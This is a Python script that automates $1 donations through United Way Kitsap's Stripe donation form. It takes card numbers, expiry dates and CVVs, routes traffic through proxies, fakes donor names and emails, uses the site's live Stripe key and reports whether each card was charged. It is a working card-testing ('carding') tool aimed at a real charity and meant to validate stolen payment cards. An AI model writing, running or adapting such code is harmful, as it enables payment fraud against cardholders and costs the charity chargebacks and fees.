import requests
import random
import re
import asyncio
from typing import Optional
from faker import Faker
from user_agent import generate_user_agent
from urllib.parse import quote
from html import unescape

fake = Faker()
domain = "https://www.unitedwaykitsap.org"

def parse_proxy(proxy_str: str) -> Optional[str]:
    if not proxy_str:
        return None
    clean_proxy = proxy_str.replace("http://", "").replace("https://", "")
    parts = clean_proxy.split(':')
    if len(parts) >= 4 and parts[1].isdigit():
        host, port = parts[0], parts[1]
        user = quote(parts[2], safe='')
        pwd = quote(':'.join(parts[3:]), safe='')
        return f"http://{user}:{pwd}@{host}:{port}"
    elif len(parts) == 2 and parts[1].isdigit():
        return f"http://{clean_proxy}"
    return proxy_str

def _run_stripe_charge2_sync(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    session = requests.Session()
    if proxy_str:
        proxy_url = parse_proxy(proxy_str)
        if proxy_url:
            session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }

    u = generate_user_agent()
    email = fake.email()
    name = fake.name()

    headers = {
        'authority': 'www.unitedwaykitsap.org',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'referer': 'https://www.unitedwaykitsap.org/Donate/?form-id=101&payment-mode=stripe&level-id=custom&custom-amount=1',
        'user-agent': u,
    }

    params = {
        'form-id': '101',
        'payment-mode': 'stripe',
        'level-id': 'custom',
        'custom-amount': '1',
    }

    try:
        # 1. Fetch form hash
        html = session.get('https://www.unitedwaykitsap.org/Donate/', params=params, cookies=session.cookies, headers=headers, timeout=20).text
        hash_match = re.search(r'name="give-form-hash" value="([^"]+)"', html)
        py_hash = hash_match.group(1) if hash_match else None
        if not py_hash:
            return False, "Failed to retrieve donation form hash"

        # 2. Register Donation Intent
        headers_ajax = {
            'authority': 'www.unitedwaykitsap.org',
            'accept': '*/*',
            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.unitedwaykitsap.org',
            'referer': 'https://www.unitedwaykitsap.org/Donate/',
            'user-agent': u,
            'x-requested-with': 'XMLHttpRequest',
        }

        data_ajax = {
            'give-honeypot': '',
            'give-form-id-prefix': '101-1',
            'give-form-id': '101',
            'give-form-title': 'Make a gift today',
            'give-current-url': 'https://www.unitedwaykitsap.org/Donate/',
            'give-form-url': 'https://www.unitedwaykitsap.org/Donate/',
            'give-form-minimum': '1',
            'give-form-maximum': '1000000',
            'give-form-hash': py_hash,
            'give-price-id': 'custom',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': '1',
            'give-recurring-period-donors-choice': 'month',
            'address': 'New york 50 park',
            'give_stripe_payment_method': '',
            'payment-mode': 'stripe',
            'give_title': 'Mr.',
            'give_first': name,
            'give_last': name,
            'give_company_name': name,
            'give_email': email,
            'card_name': name,
            'give_action': 'purchase',
            'give-gateway': 'stripe',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        }

        session.post('https://www.unitedwaykitsap.org/wp-admin/admin-ajax.php', cookies=session.cookies, headers=headers_ajax, data=data_ajax, timeout=20)

        # 3. Create Payment Method on Stripe
        headers_stripe = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': u,
        }

        year_str = str(ano)
        exp_year = year_str[-2:] if len(year_str) >= 2 else year_str.zfill(2)
        exp_month = str(mes).zfill(2)

        data_pm = f'type=card&billing_details[name]={name}+{name}&billing_details[email]={email}&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={exp_month}&card[exp_year]={exp_year}&payment_user_agent=stripe.js%2F1e42d46cc8%3B+stripe-js-v3%2F1e42d46cc8%3B+split-card-element&key=pk_live_tL7CLPLhwWj0ufyKvozklYDB'

        resp_pm = session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_pm, timeout=20)
        if resp_pm.status_code != 200:
            err_data = resp_pm.json()
            err_msg = err_data.get('error', {}).get('message', 'Failed to create Stripe payment method')
            return False, err_msg
        
        pm_id = resp_pm.json().get('id')
        if not pm_id:
            return False, "Failed to retrieve Stripe payment method ID"

        # 4. Confirm Payment and Process Donation
        headers_confirm = {
            'authority': 'www.unitedwaykitsap.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.unitedwaykitsap.org',
            'referer': 'https://www.unitedwaykitsap.org/Donate/?form-id=101&payment-mode=stripe&level-id=custom&custom-amount=1',
            'user-agent': u,
        }

        data_confirm = {
            'give-honeypot': '',
            'give-form-id-prefix': '101-1',
            'give-form-id': '101',
            'give-form-title': 'Make a gift today',
            'give-current-url': 'https://www.unitedwaykitsap.org/Donate/',
            'give-form-url': 'https://www.unitedwaykitsap.org/Donate/',
            'give-form-minimum': '1',
            'give-form-maximum': '1000000',
            'give-form-hash': py_hash,
            'give-price-id': 'custom',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': '1',
            'give-recurring-period-donors-choice': 'month',
            'address': 'New york 50 park',
            'give_stripe_payment_method': pm_id,
            'payment-mode': 'stripe',
            'give_title': 'Mr.',
            'give_first': name,
            'give_last': name,
            'give_company_name': name,
            'give_email': email,
            'card_name': name,
            'give_action': 'purchase',
            'give-gateway': 'stripe',
        }

        resp_final = session.post('https://www.unitedwaykitsap.org/Donate/', params={'payment-mode': 'stripe', 'form-id': '101'}, cookies=session.cookies, headers=headers_confirm, data=data_confirm, timeout=25)
        response_text = resp_final.text

        # 5. Extract results
        if "donation_id" in response_text or "receipt" in response_text.lower() or "success" in response_text.lower():
            return True, "CARD_CHARGED_SUCCESS"

        notice_match = re.search(r'<div[^>]*class="[^"]*give_notices[^"]*"[^>]*>(.*?)</div>\s*</div>', response_text, re.DOTALL)
        if notice_match:
            clean_err = re.sub(r'<[^>]+>', '', notice_match.group(0))
            clean_err = unescape(clean_err).strip()
            return False, clean_err

        error_match = re.search(r'Error:\s*([^<]+)', response_text)
        if error_match:
            return False, error_match.group(1).strip()

        return False, "Charge failed / Card declined"

    except Exception as e:
        return False, f"Stripe kitsap check failed: {str(e)}"

async def process_stripe_charge2(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    return await asyncio.to_thread(_run_stripe_charge2_sync, cc, mes, ano, cvv, proxy_str)
